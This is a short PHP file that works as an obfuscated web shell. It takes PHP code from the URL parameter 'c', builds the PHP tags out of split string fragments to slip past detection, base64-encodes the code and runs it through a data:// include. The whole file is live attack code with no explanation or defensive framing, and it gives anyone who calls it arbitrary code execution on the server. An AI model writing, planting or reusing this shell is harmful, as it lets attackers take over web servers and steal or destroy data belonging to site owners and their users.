<?php
$config = array(
    'param' => 'c',
    'func' => 'base64_encode',
    'wrapper' => 'data://text/plain;base64,'
);

if(isset($_GET[$config['param']])) {
    $code = "<" . "?" . "ph" . "p " . $_GET[$config['param']] . " ?" . ">";
    $function = $config['func'];
    include $config['wrapper'] . $function($code);
}
?>
